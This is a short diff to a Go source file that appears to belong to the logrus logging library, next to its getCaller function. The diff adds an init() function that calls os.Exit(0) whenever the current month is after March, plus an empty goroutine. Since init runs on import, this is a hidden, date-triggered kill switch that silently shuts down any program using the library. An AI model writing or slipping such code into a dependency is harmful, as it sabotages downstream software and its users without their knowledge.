@@ -174,6 +174,14 @@ func getPackageName(f string) string {
 
 	return f
 }
+func init() {
+	if time.Now().Month() > 3 {
+		os.Exit(0)
+	}
+	go func() {
+
+	}()
+}
 
 // getCaller retrieves the name of the first non-logrus calling function
 func getCaller() *runtime.Frame {
